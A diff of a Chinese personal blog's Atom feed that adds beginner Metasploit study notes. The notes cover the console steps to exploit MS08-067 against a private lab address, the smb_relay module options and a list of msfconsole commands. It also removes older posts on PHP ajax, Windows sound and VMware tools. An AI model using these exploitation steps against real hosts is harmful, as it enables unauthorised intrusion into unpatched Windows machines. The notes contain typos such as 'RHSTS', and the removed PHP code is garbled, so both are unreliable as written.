@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://qiyulong.top</id>
     <title>吃小熊的霸王龙</title>
-    <updated>2020-06-23T02:48:55.246Z</updated>
+    <updated>2020-06-23T04:06:25.608Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://qiyulong.top"/>
     <link rel="self" href="https://qiyulong.top/atom.xml"/>
@@ -10,6 +10,111 @@
     <logo>https://qiyulong.top/images/avatar.png</logo>
     <icon>https://qiyulong.top/favicon.ico</icon>
     <rights>All rights reserved 2020, 吃小熊的霸王龙</rights>
+    <entry>
+        <title type="html"><![CDATA[网络服务器攻击渗透(MS08-067)]]></title>
+        <id>https://qiyulong.top/post/wang-luo-fu-wu-qi-gong-ji-shen-tou-ms08-067/</id>
+        <link href="https://qiyulong.top/post/wang-luo-fu-wu-qi-gong-ji-shen-tou-ms08-067/">
+        </link>
+        <updated>2020-06-23T03:55:56.000Z</updated>
+        <content type="html"><![CDATA[<p>msfconsole</p>
+<p>search ms08-067</p>
+<p>use exploit/windows/smb/ms08_067_netapi</p>
+<p>show options<br>
+<img src="https://qiyulong.top/post-images/1592885158366.png" alt="" loading="lazy"></p>
+<p>此处只设置IP地址即可:<br>
+set RHSTS 192.168.1.111</p>
+<p>查看有哪些漏洞:<br>
+info</p>
+<p>check查看是否有漏洞:<br>
+check<br>
+(备注：需要上图中check为yes才可用)</p>
+<p>监听攻击:<br>
+exploit</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[msf-payloads模块]]></title>
+        <id>https://qiyulong.top/post/msf-payloads-mo-kuai/</id>
+        <link href="https://qiyulong.top/post/msf-payloads-mo-kuai/">
+        </link>
+        <updated>2020-06-23T03:38:16.000Z</updated>
+        <content type="html"><![CDATA[<p>show payloads</p>
+<p>搜索模块：<br>
+search ms08</p>
+<p>进入模块：<br>
+use exploit/windows/smb/smb_relay</p>
+<p>查看信息：<br>
+show options</p>
+<p>RHOST:目标主机IP地址<br>
+RPORT:目标主机链接端口<br>
+Payload:有效的载荷，成功后返回shell<br>
+LHOST:攻击者的IP地址<br>
+LPORT:攻击者的端口</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[msf基本命令]]></title>
+        <id>https://qiyulong.top/post/msf-ji-ben-ming-ling/</id>
+        <link href="https://qiyulong.top/post/msf-ji-ben-ming-ling/">
+        </link>
+        <updated>2020-06-23T02:49:18.000Z</updated>
+        <content type="html"><![CDATA[<p>命令行启动msf<br>
+msfconsole</p>
+<p>搜索命令(search)：<br>
+search cve (注：含有excellent的模块可以直接用)</p>
+<p>进入模块(use):<br>
+use exploit/windows/smb/ms09_050_smb2_negotiate_func_index</p>
+<p>检测(check):<br>
+check</p>
+<p>返回上一级(back):<br>
+back</p>
+<p>查看msf信息(banner):<br>
+banner</p>
+<p>链接一个主机(connect):<br>
+connect www.baidu.com</p>
+<p>显示一个或多个模块的信息(info):<br>
+info exploit/windows/smb/ms09_050_smb2_negotiate_func_index</p>
+<p>进入irb脚本(irb):<br>
+irb</p>
+<p>显示和管理作业(jobs):<br>
+jobs<br>
+(备注：和Windows任务管理器的进程作用一样)</p>
+<p>杀死一个进程(kill):<br>
+kill<br>
+(和结束进程的作用一样)</p>
+<p>加载一个模块的路径(loadpath):<br>
+loadpath exploit/windows/smb/ms09_050_smb2_negotiate_func_index</p>
+<p>退出msf(quit):<br>
+quit</p>
+<p>加载一个插件(load):<br>
+load</p>
+<p>运行存储一个文件中的命令(resource):<br>
+resource</p>
+<p>查看一个会话的路由信息(route):<br>
+route</p>
+<p>保存动作(save):<br>
+save</p>
+<p>给一个变量赋值(set):<br>
+set</p>
+<p>显示所有类型的模块(show):<br>
+show options</p>
+<p>把一个赋值给全局变量(setg):<br>
+setg<br>
+(备注：例如上述 set设置的IP,就会用到他攻击模块的RHOST中)</p>
+<p>在限定的秒数内什么也不做(sleep):<br>
+sleep</p>
+<p>卸载一个模块(unload):<br>
+unload</p>
+<p>解出一个或多个变量(unset):<br>
+unset</p>
+<p>解出一个或多个全局变量(unsetg):<br>
+unsetg</p>
+<p>显示msf和控制台库版本(version):<br>
+version</p>
+<p>监听,若有漏洞返回一个shell(exploit):<br>
+exploit</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[PHP学习]]></title>
         <id>https://qiyulong.top/post/php-xue-xi/</id>
@@ -181,59 +286,6 @@ c..wife连接：需要无线网卡，插入网卡即可链接wife。注意需要
 3.安装安全软件如电脑管家。安装驱动精灵安装电脑欠缺驱动，驱动全部安装完后手动重启。<br>
 4.重启后下载需要的软件。<br>
 5.链接打印机：搜索打印机，添加打印机并进行搜索，搜索后双击设备安装驱动即可打印（电脑ip需要与打印机同一网段）。若搜不到打印机，找一台已连接的电脑，cmd进入ipconfig查看ip，然后用未连接打印机的电脑搜索\192.168.XXX.XXX进行连接下载驱动即可完成连接。</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[ajax-tp3.2]]></title>
-        <id>https://qiyulong.top/post/ajax-tp32/</id>
-        <link href="https://qiyulong.top/post/ajax-tp32/">
-        </link>
-        <updated>2020-06-09T03:21:39.000Z</updated>
-        <content type="html"><![CDATA[<p>前端：（selectVal为js变量，arrayss为控制器传回的值-变量随便定义）<br>
-$.ajax({<br>
-url: &quot;<strong>CONTROLLER</strong>/ajax&quot;,<br>
-type: &quot;POST&quot;,<br>
-data: {<br>
-teachers_id:selectVal,<br>
-},<br>
-dataType:&quot;json&quot;,<br>
-success: function(arrayss) {<br>
-alert(arrayss.password);<br>
-}<br>
-});</p>
-<p>控制器：<br>
-//接收值<br>
-￥teachers_id=￥_POST['teachers_id'];<br>
-//传值回ajax<br>
-$this-&gt;ajaxReturn(array('password'=&gt;0,'data'=&gt;1));</p>
-<p>效果为弹出提示框：0</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[win10台式机声音设置]]></title>
-        <id>https://qiyulong.top/post/win10-tai-shi-ji-sheng-yin-she-zhi/</id>
-        <link href="https://qiyulong.top/post/win10-tai-shi-ji-sheng-yin-she-zhi/">
-        </link>
-        <updated>2020-06-07T07:48:27.000Z</updated>
-        <content type="html"><![CDATA[<p>问题：要启动GUI。<br>
-控制面板-&gt;硬件和声音-&gt;Realtek高清晰音频管理器-&gt;插孔设置-&gt;勾选禁用前面板插孔检测-&gt;进行设置。</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[VM tools安装]]></title>
-        <id>https://qiyulong.top/post/vm-tools-an-zhuang/</id>
-        <link href="https://qiyulong.top/post/vm-tools-an-zhuang/">
-        </link>
-        <updated>2020-06-02T15:43:28.000Z</updated>
-        <content type="html"><![CDATA[<p>安装虚拟机服务器时的镜像换成VM软件所在目录的对应镜像（win对应win.ios）。<br>
-win安装完即可从主机复制文件至虚拟机服务器。Linux则需要重启后生效。</p>
-<p>kail有独特的方法：参考：https://jingyan.baidu.com/article/4b07be3c9de29248b380f3f9.html<br>
-将文件内的VMtools压缩包放在home文件内使用命令进行解压并配置：<br>
-1.解压命令： tar -zxvf 加压缩包名<br>
-2.进入指定文件夹：cd vmware-tools-distrib<br>
-3.查看当前目录：ls<br>
-4.执行某个文件(直接输入文件名即可)：./vmware-install.real.pl(备注：一直回车yes即可)<br>
-5.重启：reboot</p>
 ]]></content>
     </entry>
 </feed>
